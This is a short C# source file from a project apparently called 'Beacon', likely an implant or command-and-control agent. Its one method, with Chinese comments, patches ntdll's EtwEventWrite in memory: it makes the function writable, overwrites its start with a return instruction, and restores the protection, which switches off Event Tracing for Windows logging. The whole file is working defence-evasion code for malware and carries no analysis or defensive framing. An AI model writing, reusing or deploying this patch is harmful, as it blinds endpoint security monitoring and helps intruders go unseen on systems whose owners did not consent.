using System;
using System.Runtime.InteropServices;
using Beacon.Utils;

namespace Beacon.Core
{
    public class ETW
    {
        /// <summary>
        /// 对ntdll.dll的 EtwEventWrite 函数进行Patch.
        /// </summary>
        /// <returns>Patch成功返回true否则返回false</returns> 
        public static bool PatchETWEventWrite()
        {
            byte[] patch;
            if (Bytes.Is64Bit)
            {
                patch = new byte[2];
                patch[0] = 0xc3;
                patch[1] = 0x00;
            }
            else
            {
                patch = new byte[3];
                patch[0] = 0xc2;
                patch[1] = 0x14;
                patch[2] = 0x00;
            }

            try
            {
                var library = Win32.Kernel32.LoadLibrary("ntdll.dll");
                var address = Win32.Kernel32.GetProcAddress(library, "EtwEventWrite");
                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
